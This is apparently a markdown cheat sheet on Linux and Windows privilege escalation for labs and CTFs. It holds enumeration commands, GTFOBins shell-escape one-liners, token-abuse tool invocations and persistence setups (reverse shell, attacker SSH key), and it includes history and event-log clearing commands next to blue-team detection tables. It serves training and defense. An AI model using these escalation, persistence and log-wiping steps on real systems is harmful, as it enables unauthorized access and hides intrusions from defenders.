---
icon: arrow-up-left-from-circle
---

# Privilege Escalation Matrix

## **Privilege Escalation Matrix — Linux & Windows**

> 🧠 For authorized labs, CTFs, and internal training.\
> This cheat sheet is not “exploit lists” — it’s an escalation **framework**: enumerate → identify → exploit → persist → clean.

***

### I. 🧩 Core Escalation Flow

#### 🧭 1. Enumeration

*   Gather everything first:

    ```bash
    whoami; id; hostname; uname -a
    ip a; netstat -tulnp
    sudo -l
    env
    ```

    ```powershell
    whoami /all
    systeminfo
    net user /domain
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    ```
* Identify **attack surface:**
  * Permissions, configs, binaries, services, creds, schedules.
* **Rule:** _Don’t exploit blind — enumerate twice, exploit once._

#### 🧱 2. Path Decision Tree

```
Credentials → Privileged Accounts
Misconfig  → Sudo / Service / Registry
Binary     → SUID / Unquoted Path / Capabilities
Kernel     → CVE / Driver / Exploit
Script     → Cron / Task / Startup
Environment→ PATH / LD_PRELOAD / DLL Hijack
```

***

### II. 🐧 Linux Privilege Escalation Matrix

| Category                            | Example Checks                        | Escalation Method                  | Tool / Command                 |
| ----------------------------------- | ------------------------------------- | ---------------------------------- | ------------------------------ |
| **Sudo Abuse**                      | `sudo -l`                             | Misconfigured commands, NOPASSWD   | GTFOBins                       |
| **SUID Binaries**                   | `find / -perm -4000 -type f`          | Abuse exec of privileged binaries  | GTFOBins                       |
| **Capabilities**                    | `getcap -r / 2>/dev/null`             | `cap_setuid`, `cap_sys_admin` etc. | `getcap`, manual               |
| **Cron Jobs**                       | `cat /etc/crontab`                    | Writable scripts executed as root  | Overwrite payload              |
| **Service Misconfigs**              | `/etc/systemd/system/*.service`       | Writable ExecStart path            | Modify service file            |
| **PATH Hijacking**                  | Writable dirs in `$PATH`              | Inject malicious binary            | PATH reorder                   |
| **NFS Misconfig**                   | `/etc/exports` with `no_root_squash`  | Mount → write as root              | `mount -o rw`                  |
| **Passwords & Keys**                | `grep -r pass /etc`                   | Reuse for root / SSH               | config/db creds                |
| **Kernel Exploit**                  | `uname -r`                            | Local kernel vuln                  | `searchsploit linux privilege` |
| **Docker Group**                    | `id` → docker group                   | Escape to host                     | `docker run -v /:/mnt`         |
| **LXD Group**                       | `id` → lxd                            | Privileged container               | LXD init exploit               |
| **Scripts & Backups**               | `/opt`, `/var/backups`                | Hardcoded creds, passwords         | read & reuse                   |
| **DB / Webapp Configs**             | `/var/www/html`                       | Reused credentials                 | SQL / SSH / sudo               |
| **SSH Keys**                        | `/home/*/.ssh/`                       | Root/user reuse                    | authorized\_keys               |
| **Writable Binaries**               | `/usr/local/bin/`                     | Replace executed binary            | PATH persistence               |
| **LD\_PRELOAD / LD\_LIBRARY\_PATH** | env manipulation                      | Run arbitrary .so as root          | export trick                   |
| **Weak File Permissions**           | `/etc/shadow`, `/etc/passwd` writable | Write your hash                    | `openssl passwd`               |

***

#### 🧠 Quick Reference: GTFOBins Hotlist

| Binary | Exploit                                                                      |
| ------ | ---------------------------------------------------------------------------- |
| `vim`  | `:!bash`                                                                     |
| `find` | `find . -exec /bin/sh \;`                                                    |
| `less` | `!bash`                                                                      |
| `awk`  | `awk 'BEGIN {system("/bin/sh")}'`                                            |
| `tar`  | `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `nmap` | `--interactive` + `!sh`                                                      |
| `bash` | `sudo bash`                                                                  |
| `perl` | `perl -e 'exec "/bin/sh";'`                                                  |

***

#### 🧱 Linux Persistence & Detection

| Persistence     | Setup                      | Detection                   |
| --------------- | -------------------------- | --------------------------- |
| Cron            | Add job in `/etc/cron.d`   | Log rotation, syslog        |
| rc.local        | Append reverse shell       | Boot logs                   |
| Systemd service | Custom service file        | `systemctl list-unit-files` |
| Bashrc          | Payload in `/root/.bashrc` | Compare hashes              |
| SSH Keys        | Insert attacker key        | Audit authorized\_keys      |
| LD\_PRELOAD     | Hooked libraries           | strace, ldd mismatch        |
| SUID Shell      | Copy /bin/bash → +s        | find / -perm -4000          |

***

### III. 🪟 Windows Privilege Escalation Matrix

| Category                     | Example Checks                                                 | Escalation Method                       | Tool / Command                        |
| ---------------------------- | -------------------------------------------------------------- | --------------------------------------- | ------------------------------------- |
| **Token Privileges**         | `whoami /priv`                                                 | Abuse `SeImpersonatePrivilege` → SYSTEM | JuicyPotato / PrintSpoofer            |
| **Service Misconfig**        | `sc qc <svc>`                                                  | Unquoted path or writable binary        | replace binary path                   |
| **Service Permissions**      | `accesschk.exe -uws "NT AUTHORITY\SYSTEM" *`                   | Modify service config                   | restart service                       |
| **AlwaysInstallElevated**    | Check registry                                                 | MSI install as SYSTEM                   | craft malicious MSI                   |
| **Scheduled Tasks**          | `schtasks /query /fo LIST /v`                                  | Writable script or binary               | replace payload                       |
| **DLL Hijacking**            | ProcMon → Missing DLL                                          | Drop malicious DLL                      | system restart                        |
| **Registry AutoRuns**        | `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Replace path                            | Startup hijack                        |
| **Unquoted Service Path**    | `sc qc` output                                                 | Insert binary before space              | PATH hijack                           |
| **Startup Folder**           | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` | Drop payload                            | auto-run                              |
| **Weak Folder ACLs**         | `icacls "C:\Program Files\*"`                                  | Replace program exe                     | ACL exploitation                      |
| **Password Disclosure**      | `findstr /si password *.config *.xml *.ini`                    | Reuse creds                             | Plaintext config leaks                |
| **Registry Secrets**         | `reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP`        | Community strings                       | info leaks                            |
| **Stored Creds**             | `cmdkey /list`                                                 | Reuse via runas / RDP                   | session pivot                         |
| **Kernel / Driver Exploit**  | `systeminfo`                                                   | CVE matching                            | exploitdb / windows-exploit-suggester |
| **LAPS Misconfig**           | Readable attributes                                            | Dump LAPS password                      | AD read perms                         |
| **WSUS Abuse**               | Rogue WSUS                                                     | Malicious updates                       | ADCS labs                             |
| **UAC Bypass**               | fodhelper.exe / eventvwr.exe                                   | Execute as admin                        | registry hijack                       |
| **Group Policy Preferences** | `Groups.xml`                                                   | Encrypted `cpassword`                   | decrypt → credential reuse            |

***

#### 🧠 JuicyPotato / PrintSpoofer Example

```powershell
JuicyPotato.exe -t * -p cmd.exe -l 1337
PrintSpoofer.exe -c "cmd.exe"
```

> Works if `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled.

***

#### 🧩 PowerUp / WinPEAS Quick Checks

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

```cmd
winPEASx64.exe > report.txt
```

> Use as reference only; on Hard+ boxes, manual triage is preferred.

***

#### 🧱 Windows Persistence & Detection

| Persistence            | Setup                | Detection            |
| ---------------------- | -------------------- | -------------------- |
| Registry Run Keys      | Create new entry     | `Sysmon Event ID 13` |
| Service Creation       | `sc create ...`      | 7045                 |
| Startup Folder         | Drop payload         | Sysmon FileCreate    |
| WMI Event Subscription | Permanent trigger    | WMI-Activity log     |
| DLL Hijack             | Path-based execution | File integrity       |
| Scheduled Task         | Hidden task          | 4698, Sysmon 1       |
| LSASS Dump / Hook      | Mimikatz injection   | 4688, Sysmon 10      |

***

### IV. 🧠 Combined Red & Blue Team Map

| Tactic                   | Linux            | Windows                       | Detection                     |
| ------------------------ | ---------------- | ----------------------------- | ----------------------------- |
| Misconfig Escalation     | sudo, SUID, cron | services, UAC, ACLs           | File / Registry modifications |
| Token / Capability Abuse | cap\_setuid      | SeImpersonatePrivilege        | Sysmon ID 1, 10               |
| Password Reuse           | configs, .ssh    | config.xml, creds.xml         | anomalous logins              |
| Kernel / Driver Exploit  | CVE chains       | CVE-2019–0836, MS16–032       | Event 1001 crash logs         |
| Persistence              | cron, rc.local   | Run keys, tasks               | 4698, syslog                  |
| Cleanup                  | remove artifacts | delete logs, reverse registry | auditd, 1102 events           |

***

### V. ⚙️ PrivEsc Automation Arsenal (for Enumeration)

| Tool                           | OS      | Description                   |
| ------------------------------ | ------- | ----------------------------- |
| **linpeas.sh**                 | Linux   | Full local enum script        |
| **lse.sh**                     | Linux   | Lightweight enumeration       |
| **linux-exploit-suggester.sh** | Linux   | Kernel/CVE detection          |
| **pspy64**                     | Linux   | Monitor cron/service          |
| **winPEASx64.exe**             | Windows | System enumeration            |
| **PowerUp.ps1**                | Windows | PrivEsc checks                |
| **Seatbelt.exe**               | Windows | Enumeration toolkit           |
| **AccessChk.exe**              | Windows | ACL permissions audit         |
| **SharpUp.exe**                | Windows | Sharp-based escalation checks |

***

### VI. 🧰 Quick Commands Reference

#### 🐧 Linux

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
grep -r pass /etc /home /opt 2>/dev/null
cat /etc/crontab
```

#### 🪟 Windows

```powershell
whoami /priv
net user administrator
wmic service get name,displayname,pathname,startmode
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

***

### VII. 🔒 Persistence vs Detection Matrix

| Technique        | Persistence Gain | Log Evidence            |
| ---------------- | ---------------- | ----------------------- |
| Cron / Task      | Scheduled exec   | syslog / event 4698     |
| SUID binary      | Exec as root     | none unless FIM         |
| PATH hijack      | Stealthy         | process trace anomalies |
| Run key          | User-level       | Registry event 13       |
| Service          | System-level     | 7045, Sysmon 6          |
| WMI Subscription | Stealth          | WMI-Activity, Sysmon 21 |

***

### VIII. 🧠 Escalation Patterns (By Difficulty)

| Difficulty | Linux Example                    | Windows Example              |
| ---------- | -------------------------------- | ---------------------------- |
| **Easy**   | `sudo -l` → GTFOBin              | Unquoted service path        |
| **Medium** | Cron → script overwrite          | SeImpersonatePrivilege       |
| **Hard**   | Capabilities abuse / PATH hijack | DLL hijack + service restart |
| **Insane** | LXD / Docker escape              | AD Delegation / Cert abuse   |

***

### IX. 💀 Forensics & Cleanup

#### Linux

```bash
history -c
rm /tmp/*.sh /tmp/rev*
unset HISTFILE
```

#### Windows

```powershell
wevtutil cl System
del /f /q C:\Users\Public\Downloads\*.exe
```

> Use only in disposable lab machines. Never on production.

***

### X. 🧱 Blue Team Detection Playbook

| Attack Type                | Event Source          | Detection Strategy                    |
| -------------------------- | --------------------- | ------------------------------------- |
| Sudo / SUID misuse         | auditd / Sysmon       | Unusual binaries executed by users    |
| Cron overwrite             | auditd                | File modification in /etc/cron\*      |
| Token privilege escalation | Sysmon                | Access to LSASS, impersonation events |
| Registry persistence       | Sysmon                | Registry modification in Run keys     |
| Kernel exploit             | Event Logs            | Process crash / new module load       |
| Service abuse              | Sysmon / Security Log | 7045 (service install)                |

***
